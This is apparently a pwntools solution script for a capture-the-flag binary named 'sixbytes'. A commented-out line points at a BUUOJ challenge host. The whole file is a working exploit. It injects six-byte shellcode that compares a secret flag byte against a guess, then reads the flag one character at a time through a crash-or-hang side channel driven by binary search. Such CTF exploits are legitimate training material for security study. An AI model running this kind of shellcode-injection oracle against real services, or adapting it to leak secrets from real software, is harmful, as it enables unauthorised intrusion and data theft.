from pwn import *

context(os='linux', arch='amd64', bits=64)
context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

def judge(index,cmp):
    try:
        #p = remote('node5.buuoj.cn',27992)
        p = process('./sixbytes')
        if index:
            shellcode = b'\x80\x7F' + p8(index) + p8(cmp) + b'\x7F\xFA'
        else:
            shellcode = b'\x80\x3F' + p8(cmp) + b'\x7F\xFB'
        p.sendline(shellcode)
        p.recv(timeout=1)
    except EOFError as e:
        #didn`t jump
        #cmp >= flag[i]
        p.close()
        return 0
    else:
        #cmp < flag[i]
        p.close()
        return 1

if __name__ == "__main__":
    """ number = [0,1,2,3,4,5,6,7,8,9]
    s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    word = [0,ord('-')] # -
    word += [char+48 for char in number]
    word += [ord(char) for char in s]
    word += [ord('_')] # _
    word += [ord(char) for char in s.lower()]
    word += [ord('{'),ord('}')] """
    
    word = [i for i in range(32,127)]
    flag = ''
    i = 0
    l = len(word)
    while True:
        length = len(flag)
        low = 0
        high = l - 1
        while low < high:
            mid = low + (high - low) // 2
            if judge(i,word[mid]) == 0:
                high = mid
            else:
                low = mid + 1
        if high == low and high == 0:
            break
        if low == high:
            result = judge(i,word[low])
            if result == 0:
                flag += chr(word[low])
            else:
                flag +=chr(word[low+1])
        if length == len(flag):
            break
        i+=1
    print(flag)